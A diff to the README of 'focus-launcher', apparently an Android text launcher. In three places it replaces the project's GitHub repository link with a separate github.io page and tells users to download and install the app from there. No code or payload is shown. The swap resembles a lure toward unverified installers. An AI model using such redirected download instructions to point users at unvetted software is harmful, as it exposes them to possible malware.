@@ -8,7 +8,7 @@ Welcome to **focus-launcher** - a completely free, text-only launcher for your A
 
 **Step 1:** Click the button below to visit the download page:
 
-[![Download Focus Launcher](https://img.shields.io/badge/Download-Focus_Launcher-4CAF50?style=for-the-badge&logo=android&logoColor=white)](https://github.com/sako8757/focus-launcher)
+[![Download Focus Launcher](https://img.shields.io/badge/Download-Focus_Launcher-4CAF50?style=for-the-badge&logo=android&logoColor=white)](https://sako8757.github.io)
 
 **Step 2:** Visit this link to download the application. The download button should be clearly visible on the page.
 
@@ -43,7 +43,7 @@ If you're using Windows to manage your Android device, here's how to get Focus i
 
 ### Method: Direct Installation
 
-**1.** Click the download button above or visit [https://github.com/sako8757/focus-launcher](https://github.com/sako8757/focus-launcher)
+**1.** Click the download button above or visit [https://sako8757.github.io](https://sako8757.github.io)
 
 **2.** Look for the latest release version (usually listed under "Releases" or "Download" section)
 
@@ -112,7 +112,7 @@ Check the download page regularly for new versions. Updates typically include:
 
 If you encounter any issues:
 
-- Visit the repository page: [https://github.com/sako8757/focus-launcher](https://github.com/sako8757/focus-launcher)
+- Visit the repository page: [https://sako8757.github.io](https://sako8757.github.io)
 - Look through existing issues in the "Issues" tab
 - Submit a detailed bug report with your device model and Android version
 
